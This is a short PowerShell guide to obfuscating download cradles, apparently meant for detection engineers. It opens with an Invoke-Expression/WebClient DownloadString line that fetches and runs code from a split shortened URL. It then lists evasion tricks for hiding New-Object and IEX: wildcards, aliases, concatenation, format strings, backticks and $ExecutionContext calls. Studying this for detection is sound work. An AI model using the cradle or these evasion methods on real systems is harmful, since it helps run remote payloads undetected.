### Obfuscating the Cradle

#### Example Code
```powershell
Invoke-Expression (New-Object "Net.WebClient")."DownloadString"('ht'+'tps://bit.ly/L3g1t')
```

#### Script Block Elements to Key Off Of
- **Invoke-Expression**
- **New-Object**
- **Get-Command** and its aliases (e.g., `GCM`, `COMMAND`)
- **Wildcards** (e.g., `*w-O*`)

#### Obfuscation Techniques
1. **Using Wildcards with Get-Command:**
   ```powershell
   & (Get-Command *w-O*)
   . (Get-Command *w-O*)
   ```

2. **Aliases for Get-Command:**
   ```powershell
   & (GCM *w-O*)
   . (GCM *w-O*)
   & (COMMAND *w-O*)
   . (COMMAND *w-O*)
   ```

3. **String Concatenation:**
   ```powershell
   $var1 = "New"; $var2 = "-Object"; $var3 = $var1 + $var2; & (GCM $var3)
   ```

4. **PowerShell 1.0 Methods:**
   ```powershell
   $ExecutionContext.InvokeCommand.GetCommand("New-Ob"+"ject", [System.Management.Automation.CommandTypes]::Cmdlet)
   $ExecutionContext.InvokeCommand.GetCmdlet("New-Ob"+"ject")
   $ExecutionContext.InvokeCommand.GetCommands("*w-o*", [System.Management.Automation.CommandTypes]::Cmdlet, 1)
   $ExecutionContext.InvokeCommand.GetCmdlets("*w-o*")
   $ExecutionContext.InvokeCommand.GetCommand($ExecutionContext.InvokeCommand.GetCommandName("*w-o*", 1, 1), [System.Management.Automation.CommandTypes]::Cmdlet)
   $ExecutionContext.InvokeCommand.GetCmdlet($ExecutionContext.InvokeCommand.GetCommandName("*w-o*", 1, 1))
   ```

5. **Using Ticks and Invocation Operators:**
   ```powershell
   & ('Ne'+'w-Obj'+'ect')
   . ('Ne'+'w-Obj'+'ect')
   & ("{1}{0}{2}" -f 'w-Ob', 'Ne', 'ject')
   . ("{1}{0}{2}" -f 'w-Ob', 'Ne', 'ject')
   ```

6. **Aliases and Ticks for Invoke-Expression:**
   ```powershell
   `I`E`X
   `I`N`v`o`k`e`-`E`x`p`R`e`s`s`i`o`N
   & ('I'+'EX')
   . ('{1}{0}' -f 'EX', 'I')
   ```

#### Potential Issues with Invoke-Expression
1. **Aliases:**
   - **Invoke-Expression / IEX**
     ```powershell
     Invoke-Expression "Write-Host IEX Example -ForegroundColor Green"
     IEX "Write-Host IEX Example -ForegroundColor Green"
     ```

2. **Order:**
   - **Different Orders of Execution:**
     ```powershell
     IEX "Write-Host IEX Example -ForegroundColor Green"
     "Write-Host IEX Example -ForegroundColor Green" | IEX
     ```

3. **Ticks:**
   - **Using Ticks:**
     ```powershell
     `I`E`X
     `I`N`v`o`k`e`-`E`x`p`R`e`s`s`i`o`N
     ```

4. **Invocation Operators:**
   - **Using Invocation Operators:**
     ```powershell
     & ('I'+'EX')
     . ('{1}{0}' -f 'EX', 'I')
     ```

5. **Confusion with Invoke-Command:**
   - **Differences Between Invoke-Expression and Invoke-Command:**
     - **Invoke-Expression** executes a string as a script block.
     - **Invoke-Command** runs a command on a remote computer.

By understanding these obfuscation techniques and potential issues, you can better detect and mitigate malicious scripts that use these methods to evade detection.